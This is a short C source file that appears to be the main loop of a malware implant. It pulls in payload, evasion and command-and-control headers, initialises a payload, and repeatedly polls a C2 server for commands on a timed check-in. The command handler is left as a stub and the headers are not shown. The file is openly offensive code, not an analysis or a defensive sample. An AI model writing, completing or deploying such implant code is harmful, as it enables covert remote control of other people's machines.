#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include "payload.h"
#include "evasion.h"
#include "c2_communication_fixed.h"

static void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf("\nReceived signal %d, cleaning up...\n", sig);
        payload_cleanup();
        exit(0);
    }
}

int main(int argc, char *argv[]) {
    // Set up signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    // Initialize payload
    if (payload_init() != 0) {
        fprintf(stderr, "Failed to initialize payload\n");
        return 1;
    }

    printf("%s v%s initialized successfully\n", get_payload_name(), get_payload_version());
    printf("Press Ctrl+C to exit\n");

    // Main loop
    while (1) {
        // Check for C2 commands
        char command[MAX_COMMAND_LENGTH];
        if (c2_receive_command(command, sizeof(command)) > 0) {
            printf("Received command: %s\n", command);
            // Process command here
        }

        sleep(C2_CHECKIN_INTERVAL);
    }

    return 0;
}